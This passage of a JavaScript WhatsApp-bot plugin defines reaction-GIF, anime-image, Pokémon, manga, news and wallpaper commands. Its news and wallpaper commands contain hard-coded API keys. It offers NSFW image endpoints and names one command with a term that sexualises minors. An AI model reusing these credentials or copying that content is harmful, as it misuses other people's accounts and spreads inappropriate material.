        Void.sendMessage(citel.chat, { video: gif, gifPlayback: true, mentions: [citel.sender], caption: cap }, { quoted: citel });
    }
}
)
//-----------------------------------------------------------------------
cmd({
    pattern: "hug",
    category: "reaction",
    use: '<quote|reply|tag>',
},
async(Void, citel) => {
    var bite = await fetchJson(`https://api.waifu.pics/sfw/hug`);
    const response = await axios.get(bite.url, {
        responseType: "arraybuffer",
    });
    const buffer = Buffer.from(response.data, "utf-8");
    let users = citel.mentionedJid ? citel.mentionedJid[0] : citel.msg.contextInfo.participant || false;
    let gif = await GIFBufferToVideoBuffer(buffer);
    if (users) {
        let cap = `@${citel.sender.split("@")[0]} hug to @${users.split("@")[0]} `;
        Void.sendMessage(citel.chat, { video: gif, gifPlayback: true, mentions: [users, citel.sender], caption: cap }, { quoted: citel });
    } else {
        let cap = `@${citel.sender.split("@")[0]} huged to everyone. `;
        Void.sendMessage(citel.chat, { video: gif, gifPlayback: true, mentions: [citel.sender], caption: cap }, { quoted: citel });
    }
}
)
//-----------------------------------------------------------------------
cmd({
    pattern: "hold",
    category: "reaction",
    use: '<quote|reply|tag>',
},
async(Void, citel) => {
    var bite = await fetchJson(`https://api.waifu.pics/sfw/handhold`);
    const response = await axios.get(bite.url, {
        responseType: "arraybuffer",
    });
    const buffer = Buffer.from(response.data, "utf-8");
    let users = citel.mentionedJid ? citel.mentionedJid[0] : citel.msg.contextInfo.participant || false;
    let gif = await GIFBufferToVideoBuffer(buffer);
    if (users) {
        let cap = `@${citel.sender.split("@")[0]} hold hand of @${users.split("@")[0]} `;
        Void.sendMessage(citel.chat, { video: gif, gifPlayback: true, mentions: [users, citel.sender], caption: cap }, { quoted: citel });
    } else {
        let cap = `@${citel.sender.split("@")[0]} holed to everyone. `;
        Void.sendMessage(citel.chat, { video: gif, gifPlayback: true, mentions: [citel.sender], caption: cap }, { quoted: citel });
    }
}
) 
//-----------------------------------------------------------------------
cmd({
    pattern: "hifi",
    category: "reaction",
    use: '<quote|reply|tag>',
},
async(Void, citel) => {
    var bite = await fetchJson(`https://api.waifu.pics/sfw/highfive`);
    const response = await axios.get(bite.url, {
        responseType: "arraybuffer",
    });
    const buffer = Buffer.from(response.data, "utf-8");
    let users = citel.mentionedJid ? citel.mentionedJid[0] : citel.msg.contextInfo.participant || false;
    let gif = await GIFBufferToVideoBuffer(buffer);
    if (users) {
        let cap = `@${citel.sender.split("@")[0]} highfive with @${users.split("@")[0]} `;
        Void.sendMessage(citel.chat, { video: gif, gifPlayback: true, mentions: [users, citel.sender], caption: cap }, { quoted: citel });
    } else {
        let cap = `@${citel.sender.split("@")[0]} highfived with everyone. `;
        Void.sendMessage(citel.chat, { video: gif, gifPlayback: true, mentions: [citel.sender], caption: cap }, { quoted: citel });
    }
}
)
//-----------------------------------------------------------------------
cmd({
pattern: "waifu",
desc: "To get Waifu Random Pics",
category: "Anime Pics",
filename: __filename
},

async(Void, citel, text) => {

 let name1 = text.split("|")[0] || ''
let name2 = text.split("|")[1] || `1`
let cap = text.split("|")[1] ? '': '---Waifu Pics Here---'
 
for (let i = 0; i < name2; i++)
{
let response;
if(name1 == 'nsfw'){ response = await fetch("https://api.waifu.pics/nsfw/waifu");    }
else  { response = await fetch("https://api.waifu.pics/sfw/waifu");  }

const nekodds = await response.json();
let buttonMessages = {
image: { url: nekodds.url, },
caption: cap,
headerType: 1,
};
await Void.sendMessage(citel.chat, buttonMessages, { quoted: citel })
}

})
//-----------------------------------------------------------------------
cmd({
pattern: "naruto",
desc: "To get Naruto Random Videos",
category: "Anime Pics",
filename: __filename
},
async(Void, citel,text) =>
{
let res=await axios.get("https://raw.githubusercontent.com/mask-sir/api.mask-ser/main/Naruto.json")
let url =  res.data.result[Math.floor(Math.random() * res.data.result.length)];
return await Void.sendMessage(citel.chat,{video :{url : url } , caption: Config.caption }, { quoted: citel })
})
//-----------------------------------------------------------------------
cmd({
pattern: "neko",
category: "Anime Pics",
desc: "Sends a Neko Image in chat",
filename: __filename
},
async(Void, citel, text) => {
let name1 = text.split("|")[0] || ''
let name2 = text.split("|")[1] || `1`
let cap = text.split("|")[1] ? '': "Here we go😊!!!!"
 
for (let i = 0; i < name2; i++)
{
let response;
if(name1 == 'nsfw'){ response = await fetch("https://waifu.pics/api/nsfw/neko");    }
else  { response = await fetch("https://waifu.pics/api/sfw/neko");  }

const nekodds = await response.json();
let buttonMessages = {
image: { url: nekodds.url, },
caption: cap,
headerType: 1,
};
await Void.sendMessage(citel.chat, buttonMessages, { quoted: citel })
}

})
//-----------------------------------------------------------------------
cmd({
pattern: "foxgirl",
category: "Anime Pics",
desc: "Sends image of Fox Girl in current chat.",
filename: __filename
},
async(Void, citel, text) => 
{
let  waifuddfg = await axios.get(`https://nekos.life/api/v2/img/fox_girl`);
await Void.sendMessage(citel.chat, {image: { url: waifuddfg.data.url } }, { quoted: citel })
})
//-----------------------------------------------------------------------
cmd({
pattern: "animenews",
category: "Anime Pics" ,
desc: "Sends Anime News in chat",
filename: __filename
},
async(Void, citel, text) => {
let qq = [
    "Anime News Today",
    "New Anime",
    "Uocoming Anime News",
    "New Anime Info",
    "Whats news in Anime",
    "Anime Series",
    "Manga News today",
    "Anime New News",
    "Anime News today",
];
let q1 = qq[Math.floor(Math.random() * qq.length)];
//&domains=techcrunch.com,animenewsnetwork.com,myanimelist.net,comingsoon.net,crunchyroll.com
let URL1 = `https://newsapi.org/v2/everything?q=${q1}&domains=techcrunch.com,animenewsnetwork.com,myanimelist.net,comingsoon.net,crunchyroll.com&language=en&sortby=publishedat&apikey=cd4116be09ef4a0caceedf21b6258460&pageSize=8`;
const response = await axios.get(URL1);
let result = await response;
result = result.data.articles;
result.map(async(r, idx) => {
    Void.sendMessage(
        citel.chat, {
            image: { url: r.urlToImage },
            caption: `*Title🔰:* ${r.title}\n\n*Content🧩:* ${r.content}\n*Author📌:* ${r.author}\n*Source♦️:* ${r.source.name}\n*Created On☘️:* ${r.publishedAt}\n*More on✨:* ${r.url}\n\n*Powered by ${tlang().title}*`,
        }, {
            quoted: citel,
        }

    );
});


}
)
//-----------------------------------------------------------------------
cmd({
pattern: "loli",
category: "Anime Pics",
filename: __filename,
desc: "Sends image of loli in current chat."
},
async(Void, citel, text) => {
waifud = await axios.get("https://waifu.pics/api/sfw/shinobu");
var wbutss = [{
buttonId: `${prefix}loli`,
buttonText: { displayText: `Next Loli✨` },
type: 1,
}, ];

await Void.sendMessage(citel.chat, {image: { url: waifud.data.url }}, {quoted: citel})
}
)
//-----------------------------------------------------------------------
/*
cmd({
pattern: "pokepic",
category: "Anime Pics",
filename: __filename,
desc: "Sends image of pokemon in current chat."
},
async(Void, citel, text) => {
const gis = require('g-i-s')
var pictured = "Pokemon Pics only HD ";
gis(text + pictured, async(error, result) => {
    n = result;
    images = n[Math.floor(Math.random() * n.length)].url;
    let buttonMessage = {
        image: {
            url: images,
        },
        caption: `*---「 Poke Pic 」---*`,
        footer: Void.user.name,
        headerType: 4,
        contextInfo: {
            externalAdReply: {
                title: tlang().title,
                body: text,
                thumbnail: log0,
                mediaType: 2,
                mediaUrl: ``,
                sourceUrl: ``,
            },
        },
    };
    Void.sendMessage(citel.chat, buttonMessage, {
        quoted: citel,
    });
});

}
)
*/
//---------------------------------------------------------------------------
cmd({
pattern: "pokemon",
category: "Anime Pics",
 filename: __filename,
desc: "Sends info of pokemon in current chat."
},
async(Void, citel, text) => {
if(!text) return citel.reply("```Uhh Please Give Me Poki Name```")
try {
let { data: data } = await axios.get(`https://pokeapi.co/api/v2/pokemon/${text}`)
if (!data.name) return citel.reply(`❌ Could not found any pokemon with that name`)
let poinfo = `*•Name: ${data.name}*\n*•Pokedex ID: ${data.id}*\n*•Height: ${data.height}*\n*•Weight: ${data.weight}*\n*•Abilities: ${data.abilities[0].ability.name}, ${data.abilities[1].ability.name}*\n*•Base Experience: ${data.base_experience}*\n*•Type: ${data.types[0].type.name}*\n*•Base Stat: ${data.stats[0].base_stat}*\n*•Attack: ${data.stats[1].base_stat}*\n*•Defense: ${data.stats[2].base_stat}*\n*•Special Attack: ${data.stats[3].base_stat}*\n*•Special Defense:${data.stats[4].base_stat}*\n*•Speed: ${data.stats[5].base_stat}*\n`
Void.sendMessage(citel.chat, { image: { url: data.sprites.front_default }, caption: poinfo }, { quoted: citel })
} catch (err) {
citel.reply("Ahh,Couldn't found any pokemon.")
//console.log(err)
}

}
)
//---------------------------------------------------------------------------
/*


cmd({
pattern: "animepic",
category: "Anime Pics",
desc: "Anime image"
},
async(Void, citel, text) => {

if(!text) return citel.reply(`give me Anime Name \n _Example: ${prefix}animepic luffy_`);
var pictured = "Anime Pics HD ";
gis(text  + pictured, async(error, result) => {
    n = result;
    images = n[Math.floor(Math.random() * n.length)].url;
    let buttonMessage = {
        image: {
            url: images,
        },
        caption: `*-----「 Anime Image 」-----*`,
        footer: Void.user.name,
        headerType: 4,
        contextInfo: {
            externalAdReply: {
                title: tlang().title,
                body: `Anime Pics`,
                thumbnail: log0,
                mediaType: 2,
                renderLargerThumbnail: true,
                mediaUrl: gurl,
                sourceUrl: ``,
            },
        },
    };
    Void.sendMessage(citel.chat, buttonMessage, {
        quoted: citel,
    });
});

}
)
*/
//-----------------------------------------------------------------------

/*
cmd({
pattern: "animewall",
category: "Anime Pics",
desc: "Anime Wallpaper Random",
 filename: __filename
},
async(Void, citel, text) => {
try {

    var ecchid = "anime wallpaper for desktop full hd";
    let gis = require("g-i-s");
    gis(ecchid, async(error, result) => {
        n = result;
        images = n[Math.floor(Math.random() * n.length)].url;
        let buttonMessage = {
            image: {
                url: images,
            },
            caption: `*--- Anime Wallpaper---*`,
            footer: Void.user.name,
            headerType: 4,
            contextInfo: {
                externalAdReply: {
                    title: tlang().title,
                    body: `Anime-Wallpaper`,
                    jpegThumbnail: log0,
                    thumbnail: log0,
                    mediaType: 2,
                    mediaUrl: ``,
                    sourceUrl: ``,
                },
            },
        };
        Void.sendMessage(citel.chat, buttonMessage, {
            quoted: citel,
        });
    })
} catch (e) {
               citel.reply("```Error While Downloading Animy Wallpaper```") ;
               
              
           
}
}
)
*/
//-----------------------------------------------------------------------
cmd({
pattern: "manga",
category: "Anime Pics",
filename: __filename,
desc: "Sends info about asked manga."
},
async(Void, citel, text) => {
const { Manga } = require("@shineiichijo/marika");
const manga = new Manga();
if (!text) return citel.reply(`Which Manga do you want to Search? \n _Please give me a name._`);
let srh = await manga.searchManga(text);
let mang = `*🎀Title: ${srh.data[0].title}*\n`;
mang += `*📈Status: ${srh.data[0].status}*\n`;
mang += `*🌸Total Volumes: ${srh.data[0].volumes}*\n`;
mang += `*🎗Total Chapters: ${srh.data[0].chapters}*\n`;
mang += `*🧧Genres:*\n`;
for (let i = 0; i < srh.data[0].genres.length; i++) {
mang += `\t\t\t\t\t\t\t\t*${srh.data[0].genres[i].name}*\n`;
}
mang += `*✨Published on: ${srh.data[0].published.from}*\n`;
mang += `*🌟Score: ${srh.data[0].scored}*\n`;
mang += `*🎐Popularity: ${srh.data[0].popularity}*\n`;
mang += `*🎏Favorites: ${srh.data[0].favorites}*\n`;
mang += `*✍Authors:*\n`;
for (let i = 0; i < srh.data[0].authors.length; i++) {
mang += `\t\t\t\t\t\t\t\t\t*${srh.data[0].authors[i].name}* *(${srh.data[0].authors[0].type})*\n`;
}
mang += `\n*🌐URL: ${srh.data[0].url}*\n\n`;
if (srh.data[0].background !== null) mang += `*🎆Background:* ${srh.data[0].background}`;
mang += `*❄️Description:* ${srh.data[0].synopsis}`;
Void.sendMessage(citel.chat, {  image: {  url: srh.data[0].images.jpg.large_image_url,  }, caption: mang, }, {  quoted: citel,  });

}
)
//----------------------------------------------------------------------------
cmd({
pattern: "anime",
category: "Anime Pics",
desc: "Searches Info about Anime and Provides result."
},
async(Void, citel, text) => {
const client = new Anime();
if (!text) return citel.reply(`Which Anime do you want to search?\n _Please give me a name._`);
let anime = await client.searchAnime(text);
let result = anime.data[0];
//console.log(result);
let details = `🎀Title: ${result.title}\n`;
details += `🎋Format: ${result.type}\n`;
details += `*📈Status: ${result.status
.toUpperCase()
.replace(/\_/g, " ")}*\n`;
details += `🍥Total episodes: ${result.episodes}\n`;
details += `🎈Duration: ${result.duration}\n`;
details += `🧧Genres:\n`;
for (let i = 0; i < result.genres.length; i++) {
details += `\t\t\t\t\t\t\t\t*${result.genres[i].name}*\n`;
}
details += `✨Based on: ${result.source.toUpperCase()}\n`;
details += `📍Studio:\n`;
for (let i = 0; i < result.studios.length; i++) {
details += `\t\t\t\t\t\t\t\t*${result.studios[i].name}*\n`;
}
details += `🎴Producers:\n`;
for (let i = 0; i < result.producers.length; i++) {
details += `\t\t\t\t\t\t\t\t\t\t*${result.producers[i].name}*\n`;
}
details += `💫Premiered on: ${result.aired.from}\n`;
details += `🎗Ended on: ${result.aired.to}\n`;
details += `🎐Popularity: ${result.popularity}\n`;
details += `🎏Favorites: ${result.favorites}\n`;
details += `🎇Rating: ${result.rating}\n`;
details += `🏅Rank: ${result.rank}\n\n`;
if (result.trailer.url !== null)
details += `♦Trailer: ${result.trailer.url}\n\n`;
details += `🌐URL: ${result.url}\n\n`;
if (result.background !== null)
details += `🎆Background: ${result.background}*\n\n`;
details += `❄Description: ${result.synopsis}`;

Void.sendMessage( citel.chat, { image: {  url: result.images.jpg.large_image_url, }, caption: details, }, { quoted: citel,});
}
)
//---------------------------------------------------------------------------

cmd({
pattern: "wallpaper",
desc: "To get Random Pics",
category: "Anime Pics",
filename: __filename
},

async(Void, citel, text) => {


const response = await fetch('https://api.unsplash.com/photos/random?client_id=72utkjatCBC-PDcx7-Kcvgod7-QOFAm2fXwEeW8b8cc');
const data = await response.json();
const url =data.urls.regular
//citel.reply ('url here :'+url);

        let buttonMessaged = {
            image: { url: url },
            caption: '*---Random Wallpapers Here---*',
            footer: tlang().footer,
            headerType: 4,
           
        };
        return await Void.sendMessage(citel.chat, buttonMessaged , {quoted : citel});


}
)






































































































// OMO I NO TRY ABEG STAR THIS REPO ahhh